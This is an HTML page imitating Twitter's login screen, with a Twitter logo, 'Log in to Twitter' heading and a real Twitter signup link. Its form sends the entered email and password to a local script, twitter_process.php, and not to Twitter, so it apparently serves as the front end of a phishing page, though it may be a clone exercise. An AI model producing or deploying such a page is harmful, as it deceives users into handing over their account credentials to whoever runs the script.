<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="with=device-width, initial-scale=1.0">
    <title>twitter form</title>
    <link rel="stylesheet" href="css/twitter.css">

    <style>
        .loginbtn {
            margin-top: 15px;
            margin-right: 50px;
            padding: 15px;
            width: 500px;
            border-radius: 30px;
            border: none;
            outline-style: none;
            color: white;
            background-color: #339BFF;
        }
    </style>

</head>

<body>
    <div class="section">
        <div class="content">

            <img style="margin-left: 80;" src="twitter.png" width="80px" height="70px">

            <div class="heading">

            </div>
            <h2 style="font-size: 35px;">
                Log in to Twitter
                <br><br>
            </h2>
        </div>

        <form name="twitter form" method="post" action="twitter_process.php">

            <div class="main">

                <div class="form">
                    
                    <input type="text" name="email" placeholder="Phone Email">
                    <br><br>
                    <input type="password" name="password" placeholder="Password">
                </div>

                <br>

                <div class="btn">
                    <!-- <button>Log In</button> -->
                    <input type="submit" class="loginbtn" value="Log in" name="save">
                </div>

                <div class="para">
                    <div class="forgot">
                        <p>Don't have an account ?</a></p>
                    </div>

                    <div class="signup">
                        <p><a href="https://twitter.com/i/flow/signup">create one</a></p>
                    </div>

                </div>
            </div>
        </form>
</body>

</html>